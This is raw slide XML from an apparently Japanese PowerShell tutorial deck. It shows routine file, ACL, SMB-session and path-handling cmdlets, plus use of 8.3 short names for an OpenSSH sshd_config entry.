                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-Content -Path S:\AIP_protected.docx -Encoding Byte |</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt;&gt; Select-Object -First 16 | Format-Hex</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>00000000   D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00  </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>ÐÏ.à</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>¡±.á........</a:t>
              </a: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B8C67490-B048-C7C8-A658-A9FD2DE6DC1B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2740701" y="3390217"/>
              <a:ext cx="3024336" cy="342038"/>
            </a:xfrm>
            <a:prstGeom prst="rect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40000"/>
                </a:lnSpc>
                <a:spcBef>
                  <a:spcPct val="0"/>
                </a:spcBef>
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600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</p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FBEDCC4B-D456-9DF7-60A0-B3C49C9E0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9" y="942581"/>
            <a:ext cx="7055905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アクセス権を確認する。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16D0F5C-8E66-6A95-EEBC-A0B1BABB13D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1300698"/>
            <a:ext cx="10432297" cy="1938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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Acl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Path S:\AIP_protected.docx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Select-Object Owner, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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AccessToString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> | </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fl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Owner          : lnv2202\swat</a:t>
            </a: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AccessToString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : BUILTIN\Administrators Allow  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FullControl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                 NT AUTHORITY\SYSTEM Allow  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>FullControl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r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr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19497933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56E744-64A5-E196-D2A4-81BEA8B6D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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイル共有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EC43BE6-B07B-50C6-6682-95CB214D06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6BCDBB2-B262-906A-FFD4-784E0833EF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32</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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ED6F9964-8595-86DB-F859-78471FA67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9" y="930206"/>
            <a:ext cx="7055905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サーバー側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60E5D62-156A-F546-BCA5-3535486C0A21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1354825"/>
            <a:ext cx="10215565" cy="1477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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SmbSession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SessionId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClientComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClientUserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NumOpens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---------     ------------------ --------------       --------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1717986918421 10.10.75.1         SEC504STUDENT\sec504 0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1A4041F-7AAC-1AF9-AA6B-8D6EF1715006}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="3758260"/>
            <a:ext cx="10215565" cy="1785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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SmbConnection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ServerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ShareName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>UserName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>     Credential      Dialect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NumOpens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---------- --------- --------     ----------      ------- --------</a:t>
            </a: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hako</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       IPC$      lnv2202\swat lnv2202\nabesin 1.5     1</a:t>
            </a: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hako</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       share     lnv2202\swat lnv2202\nabesin 1.5     2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F9F1A74F-B87A-6CCA-E62E-9D9E80E0EE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151478"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8760297" y="872716"/>
          <a:ext cx="2556283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6283">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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SmbShare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14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Get-</a:t>
                      </a:r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SmbConnection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033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Get-</a:t>
                      </a:r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SmbShare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6919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i="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Get-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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SmbSession</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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44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i="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Close-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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SmbSession</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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413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i="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Close-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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SmbOpenFile</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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1359921"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{26147B7D-2511-B619-F8C9-FF155C706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9" y="3411312"/>
            <a:ext cx="7055905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クライアント側</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B56F63F-DE7B-80B0-6576-017B6308C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5646730"/>
            <a:ext cx="9697091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net view \\SERVER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に匹敵するコマンドレットは存在しない。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5C32E881-532F-6F00-651D-739CC4ED8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2946430"/>
            <a:ext cx="9697091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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>SmbShare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は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net share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に相当する。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="9993534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5D6B80-767A-AAA9-E110-277DE0D3F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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>パスの操作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8ACBACD-A4A3-5089-04D7-4A10D5FA0F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8DF58D3-47CD-7E14-6E98-30B2D58861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33</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0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5E483FE2-6324-C72B-AAD3-33930C0051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409336"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="9661104" y="872716"/>
          <a:ext cx="1656184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810130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Cmdlet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14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Test-Path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370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Join-Path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056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Split-Path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033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i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Resolve-Path</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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447962"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl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1DE4783-5CFF-38F7-5690-F4A5044C4680}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1319333"/>
            <a:ext cx="8343357" cy="1477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Join-Path $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>env:OneDrive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "Profiles/*.ps1"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Split-Path </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Leaf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Resolve</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="92D050"/>
              </a:solidFill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Get-ZimmermanTools.ps1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powershell_utils_vmware.ps1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49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21DABA8-6CF0-200F-E4CF-E2E5A567F8B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1343472" y="3753036"/>
            <a:ext cx="7884876" cy="7078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Join-Path $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>env:OneDrive</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "Profiles/*.ps1"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Resolve-Path | Split-Path -Leaf</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5D433A67-AABE-2166-78D4-96F53DBD0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9" y="926820"/>
            <a:ext cx="8605493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OneDrive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内の特定のディレクトリから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ps1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ファイルを取得する。</a:t>
            </a:r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46A911B5-695F-AA61-E236-98023B951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2920878"/>
            <a:ext cx="10620302" cy="7925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solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-Leaf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で分割されたパスの子の側（＝ファイル名）を取得。</a:t>
            </a:r>
          </a:p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solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-Resolve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でワイルドカードを実ファイルに展開。上は下でも同じ結果。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BA87E6FF-3E05-120A-C9FD-AA5B94237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9" y="4631798"/>
            <a:ext cx="10044237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Windows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ディレクトリから最終更新日時が今年のフォルダーを抽出する。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B91A540-A458-04A8-D89A-002B739C7024}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="5041629"/>
            <a:ext cx="10430709" cy="10156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Resolve-Path -Path "$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>env:windir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/*"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Where-Object {Test-Path $_ -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NewerThan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "2023-01-01"} |</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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Where-Object {Test-Path $_ -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PathType</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> Container}</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" alt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84556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5D6B80-767A-AAA9-E110-277DE0D3F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ファイル </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>8.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイル形式（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>COM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>オブジェクトの利用）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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8ACBACD-A4A3-5089-04D7-4A10D5FA0F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8DF58D3-47CD-7E14-6E98-30B2D58861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34</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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6429BF4C-E30A-9ECC-C501-66ACEF99A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915867"/>
            <a:ext cx="10692309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OpenSSH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の</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>sshd_config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は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8.3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形式（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C:\ONGRTLNS.W95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）で記載する必要！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7B5B746-5902-BA1D-52E0-85964A6CD2E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1340768"/>
            <a:ext cx="10430709" cy="11695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Get-Content C:\ProgramData\ssh\sshd_config |</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="2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Select-String -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>SimpleMatch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> "pwsh.exe"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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Subsystem </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>C:/PROGRA~1/WindowsApps/MIABDE~1.0_X/pwsh.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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EDEF364-587E-B547-2263-35B0BB0CB8F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="4435948"/>
            <a:ext cx="10430709" cy="14773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$path = (Get-Process -Id $PID).Path </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt; $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fso</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>New-Object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Scripting.FileSystemObject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&gt; ($</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fso.GetFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>($path)).</a:t>
            </a:r>
            <a:r>
